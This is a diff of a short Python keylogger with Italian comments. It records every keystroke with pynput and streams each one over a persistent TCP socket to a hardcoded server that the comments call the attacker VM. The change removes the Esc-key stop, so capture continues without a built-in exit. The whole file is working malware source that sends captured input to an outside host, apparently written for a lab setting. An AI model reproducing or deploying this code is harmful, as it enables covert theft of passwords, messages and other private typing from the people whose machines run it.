@@ -1,33 +1,25 @@
-from pynput import keyboard
 import socket
+from pynput import keyboard
 
-# Configurazione del server
+# Configura l'indirizzo IP e la porta del server di destinazione (VM attaccante)
 SERVER_IP = '192.168.1.190'
 SERVER_PORT = 1235
 
-def invia_al_server(dati):
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((SERVER_IP, SERVER_PORT))
-        s.send(dati.encode('utf-8'))
-        s.close()
-    except Exception as e:
-        print(f"Errore nell'invio dei dati al server: {e}")
+# Crea la connessione socket
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect((SERVER_IP, SERVER_PORT))
 
 def on_press(key):
     try:
-        key_str = f"{key.char}"
+        # Invio il carattere al server
+        sock.sendall(str(key.char).encode('utf-8'))
     except AttributeError:
-        key_str = f"{key}"
-    
-    # Invia il tasto al server
-    invia_al_server(key_str)
+        # Gestione dei tasti speciali (es: spazio, invio, etc.)
+        sock.sendall(str(key).encode('utf-8'))
 
-def on_release(key):
-    if key == keyboard.Key.esc:
-        # Notifica il server e ferma il listener
-        invia_al_server('Keylogger fermato')
-        return False
-
-with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+# Avvia il listener della tastiera
+with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
+
+# Chiude la connessione socket quando il listener si interrompe
+sock.close()
